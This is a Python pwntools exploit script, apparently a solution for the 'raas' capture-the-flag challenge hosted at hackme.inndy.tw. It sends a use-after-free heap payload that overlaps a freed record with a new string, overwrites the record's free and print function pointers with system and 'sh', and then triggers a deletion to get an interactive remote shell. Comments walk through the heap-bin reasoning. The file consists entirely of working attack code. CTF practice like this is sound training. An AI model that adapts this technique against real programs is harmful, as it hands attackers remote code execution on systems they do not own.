#!/usr/bin/env python3
from pwn import *

#r = process('./raas')
r = remote('hackme.inndy.tw', 7719)
elf = ELF('./raas')
system = elf.symbols['system']
#gdb.attach(r)

payload  = b'1\n0\n1\n123\n' # Malloc first chunk
payload += b'1\n1\n1\n456\n' # Malloc second chunk
payload += b'2\n0\n2\n1\n'   # Free first chunk, then second chunk

# At this moment, the unsorted bin should be 
# "HEAD->second->first->TAIL"
#
# By first-fit policy, we can know that the next two malloc 
# would take the first chunk, then the second chunk
#
# So we can malloc the third chunk (same address as first chunk) as string,
# and the malloced string is the same address as second chunk.
# 
# Therefore, we can manipulate the content of second chunk, rewriting 
# the `free` and `print` function pointer.
#
# I've made `print` to "sh\x00\x00" and `free` to system, so the original
# call of do_del (records[idx]->free(records[idx])) would become
# system('sh\x00\x00')!

payload += b'1\n2\n2\n10\n'
payload += b'sh\x00\x00' + p32(system) + b'\n'
payload += b'2\n0\n'
r.sendline(payload)


r.interactive()
